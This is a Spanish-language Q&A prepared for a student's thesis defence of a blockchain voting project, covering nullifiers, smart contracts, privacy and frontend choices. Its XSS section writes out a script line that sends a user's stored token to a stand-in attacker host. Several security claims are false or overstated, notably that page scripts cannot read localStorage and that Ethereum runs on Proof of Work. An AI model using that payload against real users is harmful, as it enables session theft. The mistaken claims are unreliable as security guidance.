# 🎓 FAQ - Preguntas para Defensa del Tribunal

**VTB (Vote Through Blockchain)**  
**Proyecto Final - 3º Ingeniería Informática**

---

## 1️⃣ PREGUNTA: "¿Por qué usar blockchain si ya existe SQLite?"

### Respuesta Técnica

**Profesor:** Miguel Ángel Garc...

"Excelente pregunta. La respuesta está en las propiedades que necesitamos:

**SQLite proporciona:**
- ✅ Autenticación (verificar identidad)
- ✅ Control de acceso (solo usuarios elegibles)
- ✅ Criptografía de contraseñas
- ❌ Auditoría pública (los datos quedan centralizados)
- ❌ Inmutabilidad (un admin podría cambiar resultados)
- ❌ Transparencia sin confiar en administrador

**Blockchain proporciona:**
- ❌ No es bueno para autenticación (sin identidad)
- ✅ Auditoría pública (todos ven igual)
- ✅ Inmutabilidad (imposible cambiar votos)
- ✅ Descentralización (sin punto único de fallo)

**Nuestra solución híbrida:**
1. Backend autentica usuario en SQLite (Web2)
   - Backend verifica: email + contraseña
   - Backend extrae nullifier del usuario
   - Backend incluye nullifier en JWT
   
2. Backend registra voto en blockchain (Web3)
   - Backend envía: nullifier + voteHash al Smart Contract
   - Smart Contract valida que nullifier no votó aún
   - Smart Contract emite evento públicamente
   - Cualquiera puede auditar sin confiar en backend

**Beneficio único:** Combinamos autenticación con auditoría pública sin revelar identidades"

**Dibujo para mostrar:**
```
Frontend → Backend (Login)
             └─ SQLite: ¿Usuario válido? ✓
             └─ HMAC: Generar nullifier
             └─ JWT: Incluir nullifier
                └─ Frontend recibe token

Frontend → Backend (Voto)
             └─ Blockchain: Registrar voto
             └─ Emit evento VoteCast
                └─ CUALQUIERA escucha evento
                └─ VE: nullifier, voteHash, timestamp
                └─ NO VE: email, qué votó, nada de PII
```

---

## 2️⃣ PREGUNTA: "¿Cómo garantizas que nadie puede votar dos veces?"

### Respuesta Técnica

"Usa la propiedad del nullifier que es determinístico e irreversible.

**Algoritmo de generación:**

```typescript
nullifier = HMAC-SHA256(userId:electionId:vtb-voter, HMAC_SECRET)
```

**Por qué funciona:**

1. **Determinístico**: 
   - Usuario = 1, Elección = 1 → SIEMPRE genera el MISMO nullifier
   - Si intenta votar de nuevo con la misma elección
   - Genera el MISMO nullifier
   - Smart Contract tiene: `votes[electionId][nullifier] = voteHash`
   - Si nullifier ya existe → rechaza transacción

2. **Irreversible**:
   - No puedo invertir HMAC-SHA256
   - Observo nullifier = 0xabcd1234... en blockchain
   - ¿Puedo saber qué usuario_id es? NO
   - Porque HMAC es función hash de una sola dirección

3. **Implementación en Smart Contract**:

```solidity
function castVote(
  uint256 _electionId,
  bytes32 _nullifier,
  bytes32 _voteHash
) public {
  // Validar
  require(elections[_electionId].active);
  
  // ✨ LA LÍNEA CRÍTICA:
  require(
    votes[_electionId][_nullifier] == bytes32(0),
    "Ya votaste"  // ← Si sale aquí, votaste dos veces
  );
  
  // Registrar
  votes[_electionId][_nullifier] = _voteHash;
  emit VoteCast(_electionId, _nullifier, _voteHash, block.timestamp);
}
```

**Escenario de ataque:**
- Usuario Juan intenta votar 2 veces
- Login 1ª vez → nullifier1 = HMAC(juan_id, election_id, ...) = 0xabc...
- Voto 1ª vez → Smart Contract: votes[1][0xabc...] = voteHash1
- Login 2ª vez → nullifier2 = HMAC(juan_id, election_id, ...) = 0xabc... (MISMO)
- Voto 2ª vez → Smart Contract verifica: ¿votes[1][0xabc...] == 0x0? NO, ya existe
- Result: ❌ RECHAZADO

**Conclusión:** Es criptográficamente imposible votar dos veces con mismo usuario"

---

## 3️⃣ PREGUNTA: "¿Cómo proteges la privacidad del usuario?"

### Respuesta Técnica

"Con una separación clara de responsabilidades entre Web2 y Web3.

**Web2 (Backend + SQLite): MANTIENE SECRETOS**

```sql
users {
  id,
  email,              ← PII - CONFIDENCIAL
  password_hash,      ← PII - CONFIDENCIAL
  name,               ← PII - CONFIDENCIAL
  student_id,         ← PII - CONFIDENCIAL
}
```

**Web3 (Blockchain): SOLO AUDITORÍA**

```javascript
VoteCast event {
  electionId,         ← Pública (¿en qué votación?)
  nullifier,          ← Anónimo (HASH, no identidad)
  voteHash,           ← Cifrado (no sé qué votó)
  timestamp           ← Pública (¿cuándo votó?)
}
```

**Ejemplo real:**

Juan García vota por Candidato A en Elección 1:

1. Backend sabe:
   - Usuario: juan@universidad.edu
   - Candidato: A
   - Timestamp: 2025-02-15 14:30

2. Blockchain ve:
   - nullifier: 0x1a2b3c4d5e6f... (es Juan? No sé)
   - voteHash: 0x9a8b7c6d5e4f... (es voto Candidato A? No sé, está cifrado)
   - timestamp: 2025-02-15 14:30

3. Observador público ve:
   - "Se emitió un voto anónimo"
   - "No puedo vincular voto a identidad"
   - "Puedo auditar que el nullifier no votó 2 veces"
   - "Puedo contar total de votos"

**Garantía matemática:** HMAC es irreversible, así que es imposible:
- Saber qué usuario es nullifier 0x1a2b...
- Aunque tenga acceso a blockchain entero"

---

## 4️⃣ PREGUNTA: "¿Qué pasa si el backend es atacado?"

### Respuesta Técnica

"Buen punto. El backend es 'punto de confianza'. Pero limitamos el daño:

**Escenario 1: Hacker accede a SQLite**

Riesgos:
- ✅ Puede ver emails, contraseñas (hash, pero igualmente sensible)
- ✅ Puede ver quién es elegible
- ❌ NO puede cambiar votos en blockchain (inmutables)
- ❌ NO puede hacer que usuario vote 2 veces (nullifier previene)

**Escenario 2: Hacker modifica backend para aceptar nullifiers falsos**

```typescript
// Código malicioso:
function castVote(nullifier, voteHash) {
  // Sin validar que nullifier es correcto
  blockchain.callFunction(nullifier, voteHash);
}
```

Smart Contract dice: "Gracias por el nullifier, lo registraré"
- Pero si nullifier es falso (no sigue fórmula HMAC correcta)
- Smart Contract ACEPTA porque es descentralizado
- Riesgo: Múltiples nullifiers = múltiples votos

**Defensa:**
- Auditoría de código (code review)
- Pruebas (tests que verifican nullifier generation)
- Monitoring (logs de nullifiers generados)
- Backup plan: Smart Contract puede rechazar nullifiers que no sigan patrón

**Conclusión:** 
Backend es punto de confianza, pero:
1. SQLite atacado no impacta resultados
2. Blockchain es auditable por todos
3. Código abierto para que verifiquen"

---

## 5️⃣ PREGUNTA: "¿Por qué Hardhat y no Ethereum mainnet?"

### Respuesta Técnica

"Excelente pregunta sobre producción vs. demo.

**Para esta presentación: Hardhat es correcto**

```typescript
// Hardhat
- ✅ Costo: $0 (simulado)
- ✅ Velocidad: <1 segundo per transacción
- ✅ Control: Reset state, crear múltiples elecciones
- ✅ Testing: Aplicar ataques, verificar defensa
- ❌ Descentralización: Solo en mi máquina
- ❌ Producción: No adecuado

// Ethereum Mainnet
- ✅ Verdaderamente descentralizado
- ✅ Seguridad auditable globalmente
- ❌ Costo: $10-50 USD por elección (gas fees)
- ❌ Velocidad: 12-15 segundos por transacción
- ❌ Ambiental: Alto consumo energético (Proof of Work)
```

**Para producción: Usar Layer 2 (Polygon/Arbitrum)**

```
Mainnet (escaso): Ethereum
     ↓ (caro, lento)
Layer 2 (óptimo): Polygon ($0.01, <2 seg)
     ↓ (o Arbitrum, Optimism)
```

**Mi justificación académica:**
'Uso Hardhat para demostración porque:
1. El Smart Contract es idéntico a mainnet
2. La lógica de nullifier es independiente de blockchain
3. Para producción, cambiaría solo RPC_URL
4. El código demuestro que entiendo blockchain, no que tengo fondos'

**Código para cambiar a producción:**
```typescript
// Hoy:
const provider = new ethers.JsonRpcProvider("http://localhost:8545");

// Producción:
const provider = new ethers.JsonRpcProvider(
  "https://polygon-rpc.com"  // Polygon mainnet
);

// Solo cambia 1 línea, toda lógica igual ✓
```"

---

## 6️⃣ PREGUNTA: "¿Cómo explicas que el frontend NUNCA ve qué votó?"

### Respuesta Técnica

"Con el concepto de voteHash + 'client-side encryption'.

**Flujo completo:**

```
Usuario selecciona: Candidato A
         ↓
Frontend genera:
voteHash = SHA256(candidatoId + randomSalt) 
         ↓ CIFRADO, nadie sabe qué voto es
Frontend envía al Backend:
{
  token: "jwt_con_nullifier",
  electionId: 1,
  voteHash: "0x9d8c7b6a5f..." ← OPACO
}
         ↓
Backend recibe voteHash (OPACO)
Backend NO SABE que es Candidato A
Backend solo sabe:
"Este usuario quiere registrar este hash"
         ↓
Backend envía a Smart Contract:
castVote(electionId, nullifier, voteHash)
         ↓
Smart Contract:
"He registrado: nullifier → voteHash"
         ↓
Resultado en blockchain:
{
  nullifier: "0x1a2b3c...",
  voteHash: "0x9d8c7b...",
}

¿QUÉ PUEDE DEDUCIR ALGUIEN?
- Persona 1 votó en Elección 1 (por voteHash único)
- Pero: ¿Persona 1 es quién? No sé (nullifier anónimo)
- Pero: ¿Votó por quién? No sé (voteHash cifrado)
- Pero: ¿Podría haber votado por A, B, o C? Sí, todos igualmente probables
```

**Comparación con alternativas incorrectas:**

❌ Alternativa mala:
```javascript
// SI ENVIARA CANDIDATO EN CLARO
Backend recibe: {token, candidatoId}
Backend sabe: Juan votó por A
Blockchain ve: 0x1a2b... → "A"
RESULTADO: Privacidad rota
```

✅ Mi implementación:
```javascript
// ENVÍO HASH CIFRADO
Frontend calcula: voteHash = SHA256(candidatoId + salt)
Backend recibe: voteHash (NO puede deducir candidatoId)
Blockchain ve: 0x1a2b... → "0x9d8c7b..."
RESULTADO: Privacidad garantizada
```

**Conclusión:**
Backend y blockchain solo ven hashes opacos.
Auditoría matemática asegura privacidad."

---

## 7️⃣ PREGUNTA: "¿Por qué usar HMAC-SHA256 para nullifier y no otra función?"

### Respuesta Técnica

"Excelente pregunta técnica sobre criptografía.

**Opciones consideradas:**

| Función | Ventajas | Desventajas | Elegida |
|---------|----------|------------|---------|
| **HMAC-SHA256** | Determinístico, irreversible, rápido, estándar industria | Requiere secret key | ✅ SÍ |
| SHA256 solo | Determinístico, irreversible, rápido | Sin autenticación, predictible | ❌ No |
| UUID v4 | Único | NO determinístico para mismo usuario | ❌ No |
| Bcrypt | Seguro, no reversible | Muy lento (~200ms) | ❌ No |
| PBKDF2 | Seguro, configurable | Más lento que HMAC | ⚠️ Posible |

**Por qué HMAC-SHA256 es óptimo:**

1. **Determinístico**
   - Mismo userId + electionId = Mismo nullifier
   - Necesario para anti-double-voto

2. **No reversible** (crucial)
   - Tan irreversible como SHA256
   - Pero además incluye secret_key
   - Si alguien tiene HMAC(x), no puede generar x nuevo

3. **Rápido** (<1ms)
   - En login se ejecuta en request
   - No puede ser botleneck

4. **Estándar industria**
   - HMAC es RFC 2104
   - Usado en JWT, OAuth, etc.
   - Auditoría académica confiable

5. **Fácil de auditar**
   ```typescript
   nullifier = HMAC-SHA256(
     message: userId + ":" + electionId + ":vtb-voter",
     key: HMAC_SECRET
   )
   ```
   Líneas claras, fácil de verificar, no hay magia

**Implementación en backend:**

```typescript
import crypto from 'crypto';

const HMAC_SECRET = process.env.HMAC_SECRET; // 32+ bytes

function generateNullifier(userId: number, electionId: number): string {
  const message = `${userId}:${electionId}:vtb-voter`;
  
  const hmac = crypto
    .createHmac('sha256', HMAC_SECRET)
    .update(message, 'utf-8')
    .digest('hex');
  
  return '0x' + hmac;
}
```

**Prueba matemática:**
```
Propiedad 1: Determinístico
  generateNullifier(1, 1) = generateNullifier(1, 1)  ✓

Propiedad 2: Único (con probabilidad 2^-256)
  generateNullifier(1, 1) ≠ generateNullifier(2, 1)  ✓

Propiedad 3: Irreversible
  No existe función f tal que f(nullifier) = userId  ✓
  (Porque f^-1(HMAC) no existe en O(2^256))

Propiedad 4: Colisión imposible (con probabilidad 2^-256)
  Dos usuarios diferentes nunca generan mismo nullifier  ✓
```

**Conclusión:** HMAC-SHA256 es la elección correcta para este caso de uso"

---

## 8️⃣ PREGUNTA: "¿Cómo se integra el i18n y no fue solo 'nice-to-have'?"

### Respuesta Técnica

"L'i18n es arquitectónico, no cosmético.

**Integración en Frontend:**

```typescript
// src/i18n/config.ts (1000+ líneas)
export const resources = {
  en: {
    translation: {
      landing: {
        title: "End-to-End Voting",
        subtitle: "Secret. Auditable. Immutable.",
      },
      voting: {
        newVote: "New vote cast",
        anonymously: "anonymously",
      }
    }
  },
  es: {
    translation: {
      landing: {
        title: "Votación E2E",
        subtitle: "Secreta. Auditable. Inmutable.",
      },
      voting: {
        newVote: "Nuevo voto emitido",
        anonymously: "anónimamente",
      }
    }
  }
};

// src/main.jsx
import i18n from 'i18next';
i18n.use(initReactI18Next).init({resources});

// Componentes
import { useTranslation } from 'react-i18next';
export function Landing() {
  const { t, i18n } = useTranslation();
  
  // Dinámico: si usuario selecciona ES, TODO cambia
  return <h1>{t('landing.title')}</h1>;  // 'Votación E2E'
}
```

**Por qué es importante:**
1. **Enseñanza**: Demuestra I18n en architectural design
2. **Mercado**: Aplicación international-ready
3. **UX**: Usuario español entiende 100% de interfaz
4. **Testing**: Verifico que traducción no rompe layout

**Alternativa mala:**
```javascript
// ❌ Hardcoded
<h1>Voting Booth</h1>  // Solo inglés
```

**Mi implementación:**
```javascript
// ✅ i18n
<h1>{t('voting.title')}</h1>  // Inglés o Español según preferencia
```"

---

## 9️⃣ PREGUNTA: "¿Por qué React con Vite y no Next.js?"

### Respuesta Técnica

"Buena pregunta sobre framework choice.

**Comparación:**

| Feature | React + Vite | Next.js | Elegida |
|---------|--------------|---------|---------|
| **Build time** | <100ms | >1s | Vite ✅ |
| **HMR (dev)** | <100ms | >500ms | Vite ✅ |
| **API routes** | No | Sí | No necesario |
| **SSR** | Complicado | Built-in | No necesario |
| **Complexity** | Simple | Media | Vite ✅ |
| **Deployment** | Static CDN | Vercel/Node | Static CDN ✅ |

**Por qué Vite es mejor para este proyecto:**

1. **DX (Developer Experience)**
   - Cambio código → refresh en <100ms
   - En Vite: Casi-instantáneo
   - En Next.js: Con overhead de Next

2. **No necesito API routes**
   - Backend separado en Node.js/Express
   - Frontend es solo cliente Web3
   - Next.js API routes serían redundantes

3. **Deploys**
   - Vite produce static files → Netlify/Vercel (gratis)
   - Next.js requiere Node runtime

4. **Tamaño bundle**
   - Vite: ~150KB (min + gzip)
   - Next.js: ~200KB+ (extra features no usadas)

**Cuando Next.js SÍ sería mejor:**
- Si necesitara SSR (pre-renderizar HTML)
- Si necesitara API routes en frontend
- Si quisiera monolitic app

**Conclusión:** React + Vite es la elección óptima para SPA Web3"

---

## 🔟 PREGUNTA: "¿Cómo evitas ataques XSS en frontend?"

### Respuesta Técnica

"Con varias capas:

```javascript
// 1. React escapa automáticamente
<div>{userInput}</div>  // React lo escapa

// 2. Nunca uso dangerouslySetInnerHTML
❌ <div dangerouslySetInnerHTML={{__html: userInput}} />
✅ <div>{userInput}</div>

// 3. i18n es seguro (no interpolo directamente)
✅ t('key')  // Seguro
❌ t('key_' + userInput)  // Riesgo

// 4. ethers.js valida datos
const provider = new ethers.JsonRpcProvider(RPC_URL);
// ethers valida que RPC responde con JSON válido

// 5. JWT storage
localStorage.setItem('token', jwt);
// JWT es signed, no puede ser alterado

// 6. Content Security Policy (en producción)
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; img-src 'self' https:;">
```

**Escenario de ataque:**
```javascript
// Usuario malintencionado intenta XSS:
<script>fetch('api.attacker.com?token=' + localStorage.token)</script>

// Mi defensa:
1. CSP rechaza script (no de 'self')
2. localStorage no accesible desde <script> en HTML (SOP)
3. React escapa si viene en estado
4. JWT es httpOnly en cookies (mejor que localStorage)
```"

---

## BONUS: PREGUNTAS INESPERADAS

### P: "¿Qué pasa si la red Hardhat cae?"

**A:** "Los votos quedan pendientes hasta que vuelva online. Para producción usaría layer 2 (Polygon) con 99.99% uptime garantizado."

### P: "¿Cuánto cuesta ejecutar esto?"

**A:** "Hoy: $0 (Hardhat es local). En producción: ~$0.01 por voto en Polygon. 10,000 votos = $100 en gas."

### P: "¿Cómo audita un observador externo?"

**A:** "Le doy:
1. Dirección Smart Contract
2. Dirección RPC (Hardhat o Polygon)
3. Ejecuta ethers.js para ver eventos VoteCast
4. Cuenta nullifiers, verifica no hay duplicados
5. Ve que es genuino sin confiar en mi palabra"

### P: "¿Por qué no usaste Vuejs en lugar de React?"

**A:** "React tiene mayor ecosystem (ethers.js ejemplos), comunidad Web3 es React-first. Vue es igual de válido, elegí React por pragmatismo."

### P: "¿Y si alguien comparte su contraseña?"

**A:** "Su nullifier se usa sin su consentimiento. Para producción: 2FA, biometría, auditoría de logins."

---

## CIERRE PARA TRIBUNAL

"Este proyecto demuestra que entiendo:

1. **Criptografía:**
   - HMAC-SHA256 para determinismo + seguridad
   - Hash functions para privacidad

2. **Arquitectura:**
   - Separación Web2/Web3
   - Dead reliable patterns (relayer)

3. **Blockchain:**
   - Smart Contracts en Solidity
   - Events para auditoría pública

4. **Backend:**
   - Express, SQLite, JWT
   - Integración blockchain (ethers.js)

5. **Frontend:**
   - React + Vite para performance
   - UX (dark mode, i18n, animaciones)
   - Real-time event listening

6. **Seguridad:**
   - Anti-double-voto
   - PII protection
   - Open source para verificación

Es una solución académicamente rigurosa y comercialmente viable."

---

**Fin de FAQ para Defensa** 🎓
